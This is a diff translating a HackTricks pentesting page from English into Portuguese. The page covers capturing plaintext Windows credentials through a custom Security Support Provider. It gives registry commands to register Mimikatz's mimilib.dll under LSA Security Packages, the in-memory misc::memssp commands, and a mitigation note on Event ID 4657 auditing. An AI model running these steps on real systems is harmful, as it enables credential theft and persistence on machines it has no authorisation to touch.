@@ -1,34 +1,32 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 
-# Custom SSP
+# SSP Personalizado
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[Veja o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
+Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.
 
 ### Mimilib
 
-You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
-Drop the dll in `C:\Windows\System32\`\
-Get a list existing LSA Security Packages:
+Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto claro.**\
+Coloque o dll em `C:\Windows\System32\`\
+Obtenha uma lista de pacotes de segurança LSA existentes:
 
-{% code title="attacker@target" %}
+{% code title="atacante@alvo" %}
 ```bash
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
@@ -37,44 +35,38 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 ```
 {% endcode %}
 
-Add `mimilib.dll` to the Security Support Provider list (Security Packages):
-
+Adicione `mimilib.dll` à lista de provedores de suporte de segurança (Security Packages):
 ```csharp
 PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+E após uma reinicialização, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`
 
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+### Na memória
 
-### In memory
-
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
-
+Você também pode injetar isso diretamente na memória usando o Mimikatz (observe que pode ser um pouco instável/não funcionar):
 ```csharp
 privilege::debug
 misc::memssp
 ```
+Isso não sobreviverá a reinicializações.
 
-This won't survive reboots.
+## Mitigação
 
-## Mitigation
-
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+ID do evento 4657 - Auditoria da criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
